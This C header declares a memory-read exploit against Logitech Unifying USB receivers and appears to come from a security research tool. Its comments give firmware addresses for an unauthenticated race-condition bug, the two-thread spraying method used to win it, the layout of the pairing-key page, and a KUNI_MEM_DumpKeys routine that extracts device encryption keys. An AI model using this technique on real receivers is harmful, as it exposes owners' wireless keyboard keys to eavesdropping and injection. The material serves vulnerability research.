#pragma once
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "logitech_unifying_spray.h"

/*	ARBITRARY 16-BIT XDATA READ, UNAUTHENTICATED
 *
 *	GET_REGISTER 0xd4 stores its offset in XDATA, checks it, scans the NVM, then
 *	RE-READS the same two bytes to build the address - without checking again:
 *
 *	    317b  LCALL 0x590b        ; [0x8370] = p1 (high), [0x8371] = p0 (low)
 *	    3184  bounds check on both
 *	    318e  JNC 0x31ab          ; offset >= 0x0010 -> bounded path, re-checked
 *	    3190  MOV R7,#0x7c ; LCALL 0x1bb4    <- the window, an NVM scan (27 us)
 *	    319b  re-reads [0x8370] and [0x8371] <- no second check
 *	    31a5  DPTR = <NVM record 0x7c> + offset
 *	    31bf  MOVX A,@DPTR ; the byte leaves in p2
 *
 *	Both offset bytes sit in the DJ write window (DJ_WRITE_FIRST..DJ_WRITE_LAST), so
 *	they can be rewritten while the request runs. On the nRF24LU1+ XDATA
 *	0x0000-0x7fff IS the flash, so this reads the application, the NVM, the
 *	pairing key page and the bootloader, plus the SRAM above 0x8000.
 *
 *	The bound is on the full 16-bit offset, so BOTH bytes have to be rewritten
 *	inside the window: hence two sprayers, about one request in ten. They share
 *	one DJ handle - two handles on the same collection make every transfer fail
 *	with ERROR_GEN_FAILURE.
 *
 *	/!\ A partially won race answers with something plausible, so a plain
 *	majority vote picks a wrong byte. Four outcomes, three of them predictable:
 *
 *	    neither byte landed : Record[p0]                 depends on p0
 *	    only the high byte  : memory[Base + hi*256 + p0] depends on p0
 *	    only the low byte   : memory[Base + lo]          does not
 *	    both                : the target
 *
 *	So: sweep p0, subtract the three known values each round, and accept a value
 *	that survives two different p0. A target equal to memory[Base + lo] can never
 *	be told apart from it - KUNI_MEM_ReadByte then says so.
 *
 *	/!\ Reading is not neutral: 0x8370/0x8371 is the scratch pair of many
 *	handlers, some of which write NVM records. Sustained spraying compacts the
 *	store and eventually stops the dongle answering; a replug (its own boot) cures it.
 */

#define MEM_TOCTOU_OFFSET_HI		0x8370
#define MEM_TOCTOU_OFFSET_LO		0x8371

/*	Two flash maps, auto-detected at open. RQR12.11 (RSA-signed bootloader): device-data
 *	store at 0x6400, key page at 0x6800. RQR12.10 (no-RSA bootloader): the whole flash is
 *	shifted by +0x0800 (store 0x6C00, keys 0x7000). Only the flash base moves - SRAM
 *	scratch, handlers and record layout are identical. NvmFirst holds the detected base;
 *	the store span and key page derive from it.
 */
#define MEM_NVM_SIZE				0x400  // device-data store span, both maps
#define MEM_NVM_FIRST_SIGNED		0x6400 // RQR12.11
#define MEM_NVM_FIRST_UNSIGNED		0x6c00 // RQR12.10 (whole flash +0x0800)
#define MEM_NVM_RECORD_ORDER		0x7c   // the record 0x3190 hardcodes: our base

 /*	Six 32-byte blocks right after the store (0x6800 signed / 0x7000 unsigned): byte 0 is
  *	the slot tag, bytes 1..16 the stored material - 4 of device address, 2 of device WPID,
  *	2 forced to the receiver WPID, then 8 secret. 0x3760 initialises all six to tag + 0xff.
  */
#define MEM_KEY_STRIDE				0x20
#define MEM_KEY_SLOTS				6

typedef struct _KUNI_MEM_HANDLE {
	HID_HANDLES* pHidPP;
	KUNI_CO_HANDLE Dj;	// one handle, both sprayers write through it
	KUNI_SPRAY Hi;
	KUNI_SPRAY Lo;

	WORD NvmFirst;		// detected store base: 0x6400 (signed) or 0x6c00 (unsigned map)
	WORD Base;			// address of NVM record 0x7c
	BYTE Nvm[MEM_NVM_SIZE]; // store snapshot, read once, makes two noises exact

	WORD HiNoiseFor;	// which high byte HiNoise[] was measured for
	BYTE HiNoise[0x10];
	BOOL HiNoiseOk[0x10];

	LONG BadRounds;		// consecutive rounds losing requests: the dongle is going under
	LONG Requests;		// register round-trips issued (bounded snapshot + every vote): the read side of the USB traffic
	ULONGLONG OpenTick;	// KUNI_MEM_Open time, for the overall USB rate reported at close
	LONGLONG SnapRate;	// bounded snapshot reads/s: a cheap early read on the port's OUT health, gates the race
	BOOL Ticking;		// ReadByte prints a dot per round while set; owned by KUNI_MEM_SelfTest (the pre/post health check), off for the clean key dump

	/*	Hill-climbed on WINS PER SECOND, the only quantity that matters: a byte
	 *	needs a fixed number of wins. Spraying harder raises the win rate and
	 *	lengthens every request, so the product peaks in the middle - measured
	 *	26 wins/s at 250 us against 3 at 2500. The win rate is not observable at
	 *	an unknown address, but the two partial outcomes are and their product
	 *	tracks it.
	 */
	LONG SprayDelayUs;
	LONG SprayFloorUs;	// raised when the measured frame rate runs away
	LONG SprayDirection;
	double Throughput;
} KUNI_MEM_HANDLE, * PKUNI_MEM_HANDLE;

#define KUNI_MEM_Sprayed(pMem)	((pMem)->Hi.Frames + (pMem)->Lo.Frames)
#define KUNI_MEM_UsbOps(pMem)	(KUNI_MEM_Sprayed(pMem) + (pMem)->Requests) // every frame on the wire: sprayed noise + register reads

#define KUNI_MEM_KeyPage(pMem)		((WORD) ((pMem)->NvmFirst + MEM_NVM_SIZE)) // 0x6800 / 0x7000
#define KUNI_MEM_InNvm(pMem, Addr)	(((Addr) >= (pMem)->NvmFirst) && ((Addr) < (WORD) ((pMem)->NvmFirst + MEM_NVM_SIZE)))
#define KUNI_MEM_Nvm(pMem, Addr)	((pMem)->Nvm[(Addr) - (pMem)->NvmFirst])
#define KUNI_MEM_Record(pMem, i)	KUNI_MEM_Nvm(pMem, (WORD) ((pMem)->Base + (i)))

BOOL KUNI_MEM_Open(KUNI_MEM_HANDLE* pMem, HID_HANDLES* pHidPP); // refuses a port too slow for the spray (see MEM_MIN_SNAP_READS_S)
void KUNI_MEM_Close(KUNI_MEM_HANDLE* pMem);

BOOL KUNI_MEM_ReadNvmByte(HID_HANDLES* pHidPP, WORD Address, BYTE* pValue); // bounded path, no race
BOOL KUNI_MEM_ReadByte(KUNI_MEM_HANDLE* pMem, WORD Address, BYTE* pValue);  // anywhere, ~0.6 s

/*	The permutation of 0x35b4, identical to munifying's KeyData2Key.
 */
void KUNI_MEM_KeyDataToKey(const BYTE KeyData[0x10], BYTE Key[0x10]);

/*	The whole /keys command: list every device (spray-free), open the race once if any link
 *	is encrypted, extract each key with a pre-check before and a post-check after, then close.
 *	Prints its own report; the caller only has to have found the receiver in firmware mode.
 */
void KUNI_MEM_DumpKeys(HID_HANDLES* pHidPP);
